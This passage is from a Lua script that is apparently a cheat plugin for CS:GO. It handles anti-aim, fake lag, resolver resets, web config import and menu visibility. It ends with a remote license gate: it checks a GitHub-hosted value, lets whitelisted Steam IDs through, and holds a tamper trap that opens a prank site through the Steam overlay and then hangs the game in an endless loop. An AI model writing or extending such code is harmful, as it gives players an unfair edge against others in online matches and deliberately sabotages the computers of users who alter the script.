                -- The function gave an error, let the user know.
                opulent.print( "Failed to load config, ensure that it's not empty!" )
                client.exec( "play ui\\menu_invalid" )
                return
            end
    
            -- Now parse it to convert it to a usable array.
            new_config = json.parse( config_string )
    
            -- Now apply our new config.
            configs.apply( new_config )
            -- Notify the user.
            client.exec( "play ui\\csgo_ui_store_select" )
            opulent.print( "Successfully loaded config from web" )
        end )
    end )
end

-- Create a regular ui element to check if we want to display the config system.
items.display_configs = opulent.new_menu_item( ui.new_checkbox, "Display configs" )

-- Our config related menu items.
configs.current = ui.new_combobox( "AA", "Anti-aimbot angles", "Current config", table.unpack( configs.names ) )
configs.save_button = ui.new_button( "AA", "Anti-aimbot angles", "Save", configs.save )
configs.load_button = ui.new_button( "AA", "Anti-aimbot angles", "Load", configs.load )
configs.import_button = ui.new_button( "AA", "Anti-aimbot angles", "Import", configs.import )
configs.export_button = ui.new_button( "AA", "Anti-aimbot angles", "Export", configs.export )
configs.web_config_name = ui.new_combobox( "AA", "Anti-aimbot angles", "Web config", "Beta", "Live" )
configs.import_web_config = ui.new_button( "AA", "Anti-aimbot angles", "Import config from web", configs.import_from_web )

-- Holds all of our initialization related items; handling menu visibility, binding events, etc.
local entry = {
    -- Create an array that holds events and their associated functions for automation later on.
    -- Format: [ event ] = { associated functions }
    bound_events = {
        [ "setup_command" ] = { anti_aim.command_handling, ideal_tick.run, anti_aim.handle_keybinds, get_head_hitbox  },
        [ "net_update_end" ] = { anti_aim.immunity_detection, anti_aim.lag_handling, anti_aim.anti_backstab },
        [ "run_command" ] = { anti_aim.handle_state, anti_aim.run },
        [ "player_say" ] = { chat.run },
        [ "round_start" ] = { opulent.reset_data, reset_brute_round },
        [ "cs_game_disconnected" ] = { opulent.reset_data},
        [ "paint" ] = { indicators.run, clan_tag.run },
        [ "shutdown" ] = { opulent.on_unload},
        [ "pre_render" ] = {opulent.animations },
        [ "bullet_impact" ] = {on_bullet_impact},
        [ "player_hurt" ] = { on_player_hurt },
        [ "level_init" ] = { reset_brute_game, reset_brute_round },
        [ "player_connect_full" ] = { reset_brute_game, reset_brute_round }

    },
    -- An array of items we want to hide if our master switch is toggled on.
    hidden_items = {
        references.anti_aim,
        references.pitch,
        references.yaw_base,
        references.yaw,
        references.yaw_jitter,
        references.body_yaw,
        references.freestanding_body_yaw,
        references.edge_yaw,
        references.freestanding,
        references.roll
    },
    -- An array of items we want hidden if our custom anti-aim is on.
    aa_hidden_items = {
        references.fake_lag,
        references.fake_lag_amount,
        references.fake_lag_variance,
        references.fake_lag_limit
    },
    initialized = false
}

function entry.ghetto_fix( )
    -- Store our master switch value to save us from gabbing it a plethora of times.
    local state = ui.get( items.master_switch )

    -- Iterate over the items we want to hide/show depending on our master switch.
    for i=1, #entry.hidden_items do
        local item = entry.hidden_items[ i ]
        -- Is this a regular menu item?
        if type( item ) ~= "table" then
            ui.set_visible( item, not state )
        else
            -- Same as above, except iterate over each member.
            for j=1, #item do
                ui.set_visible( item[ j ], not state )
            end
        end
    end

    -- Same as above, handle our anti-aim dependant menu items if our master switch is on.
    local aa_state = ui.get( items.anti_aim )
    if not state then
        aa_state = false
    end

    for i=1, #entry.aa_hidden_items do
        local item = entry.aa_hidden_items[ i ]
        -- Is this a regular menu item?
        if type( item ) ~= "table" then
            ui.set_visible( item, not aa_state )
        else
            -- Same as above, except iterate over each member.
            for j=1, #item do
                ui.set_visible( item[ j ], not aa_state )
            end
        end
    end
end

entry.update_visibility = function( )
    -- Store our master switch value to save us from gabbing it a plethora of times.
    local state = ui.get( items.master_switch )
    -- Same as above.
    local display_configs = ui.get( items.display_configs )

    -- Our config system does not hold it's menu items in the 'items' array, so we need to set it seperately.
    for k, v in pairs(configs) do
        -- Is the value a number/menu item?
        if type( v ) == "number" then
            ui.set_visible( v, state and display_configs )
        end
    end

    -- Ensure we at least have the 'default' and 'safe' options for anti-aim enabled at all times.
    -- This must be done prior to processing otherwise the sub items become invisible.
    ui.set( items.state_enabled[ 1 ], true )
    ui.set( items.state_enabled[ 2 ], true )

    -- Create a variable to keep track of how many times we've iterated.
    local iter = 0

    -- Now to handle visibility; most luas check every single item, every single frame,
    -- and this is palpably not a good idea. We can circumvent this by only handling our items
    -- under 2 conditions: when the lua is first loaded, and when the value of one of our
    -- items has changed; we achieve this with entry.initialized and ui.set_callback respectively.
    for _, item in pairs( items ) do
        -- We obviously don't want our master switch visibility set to itself.
        if item == items.master_switch or item == items.master_switch_label then
            goto continue
        end

        -- Ensure our item isn't an array.
        if type( item ) ~= "table" then
            -- The lua has just been loaded, attach a callback to this function
            -- so we re-run it every time the value of this item changes.
            if not entry.initialized then
                ui.set_callback( item, entry.update_visibility )
            end

            -- Same as the master switch, we don't want this to use the visibility of itself.
            if item == items.display_configs then
                ui.set_visible( item, state )
            else
                -- Set the item's visibility in accordance with the master switch.
                ui.set_visible( item, state and not display_configs )
            end
        else
            -- We're dealing with an array, perform the same actions on each member.
            for i=1, #item do
                if not entry.initialized then
                    ui.set_callback( item[ i ], entry.update_visibility )
                end

                ui.set_visible( item[ i ], state and not display_configs )
            end
        end

        ::continue::
        -- Increment our iteration variable.
        iter = iter + 1
    end

    -- If this is our initial load, let the user know where we are.
    if not entry.initialized then
        opulent.print( "Handled ", iter, " menu items" )
    end

    -- Now, time to handle the items that have special visibility checks. We'll start by iterating
    -- over the item with the conditions, the key, and the conditions themselves, the value.
    for item, conditions in pairs( opulent.conditional_items ) do
        -- Again, ensure we aren't dealing with an array.
        if type( item ) ~= "table" then
            -- Iterate over the conditions themselves.
            for i=1, #conditions do
                -- Now compare the current condition value to the true value, the 2nd member of the nested array.
                if ui.get( conditions[ i ][ 1 ] ) ~= conditions[ i ][ 2 ] then
                    -- The required value is not true, set the item's visibility to false and break the loop.
                    ui.set_visible( item, false )
                    break
                end
            end
        else
            -- This item is an array, iterate over the members and perform the same actions.
            for i=1, #item do
                for j=1, #conditions do
                    if ui.get( conditions[ j ][ 1 ] ) ~= conditions[ j ][ 2 ] then
                        ui.set_visible( item[ i ], false )
                        break
                    end
                end
            end
        end
    end

    -- Stop the handling from making the safety triggers visible under the safe state itself.
    ui.set_visible( items.safety_triggers[ 2 ], false )
    ui.set_visible( items.danger_threshold[ 2 ], false )

    -- Finally, tell the lua that we have run all of our initialization code.
    entry.initialized = true
end

entry.initialize = function( )
    -- Utilize an inline conditional here to decide whether we want to attach functions to the event or detach them.
    local set_event_callback = ui.get( items.master_switch ) and client.set_event_callback or client.unset_event_callback

    -- Create a variable to keep track of how many times we've iterated.
    local iter = 0

    -- Iterate over every desired event and it's bound functions.
    for event, functions in pairs( entry.bound_events ) do
        -- Now iterate over the list of associated functions.
        for i=1, #functions do
            set_event_callback( event, functions[ i ] )
            -- Increase our iteration variable.
            iter = iter + 1
        end
    end

    -- If we haven't already run through this, let the user know what we're doing.
    if not entry.initialized then
        opulent.print( "Allocated ", iter, " events" )
    end

    -- Set a special callback for our master switch here so that we return to this function whenever it's value changes.
    -- We want this to occur so that we can reattach/detach our functions from the events depending on our master switch value.
    ui.set_callback( items.master_switch, entry.initialize )
    entry.update_visibility( )
end

local function scare_user( )
    panorama.open( ).SteamOverlayAPI.OpenExternalBrowserURL( "https://youareanidiot.cc/" )
end

-- Clear our console so our updates are clear.
client.exec( "clear" )

-- Notify user of stage.
opulent.print( "Beginning initialization" )

local whitelisted_users = {
    "76561199300217771",
    "76561199495659486",
    "76561198872575045",
    "76561198999015721"
}

local db_string = "https://raw.githubusercontent.com/skartagh/opulent_server/main/state"
http.get( db_string, function( success, response )
    if db_string:len( ) ~= 68 then
        scare_user( )
        while true do
            print( "I am an idiot" )
        end
        return
    end

    local failed_to_return = false

    if not success or response.status ~= 200 then
        local steam_id64 = panorama.open( ).MyPersonaAPI.GetXuid( )
        for i=1, #whitelisted_users do
            if whitelisted_users[ i ] == steam_id64 then
                goto continue
            end
        end
        
        error( "Opulent failed to connect to the server [ connected: " .. tostring( success ) .. " | status: " .. tostring( response.status ) .. " ]" )
        failed_to_return = true
        return
    elseif response.body:sub( 1, -2 ) ~= "aSBsb3ZlIHRyZW50IGhvcm4=" then
        error( "Opulent failed to connect to the server" )
        failed_to_return = true
        return
    end

    if failed_to_return then
        return
    end

    ::continue::

    opulent.print( "Connected to the security server" )

    -- Initialize events, item visibility, etc.
    entry.initialize( )

    -- Set the event for our label handling, regardless of master switch state.
    client.set_event_callback( "paint_ui", opulent.label_handling )

    client.set_event_callback( "paint_ui", entry.ghetto_fix )

    -- Same for our console input handling.
    client.set_event_callback( "console_input", opulent.console_handling )
    -- Ensure we re-run our visibility handling on unload to reverse any changes we made.
    client.set_event_callback( "shutdown", entry.ghetto_fix )

    -- Finally, tell our user we have successfully loaded the lua.
    opulent.print( "Type 'update log' into console to see the latest updates!" )
    opulent.print( "Opulent has been loaded [ version: live ]" )
    client.exec( "play ui\\mm_success_lets_roll" )
end )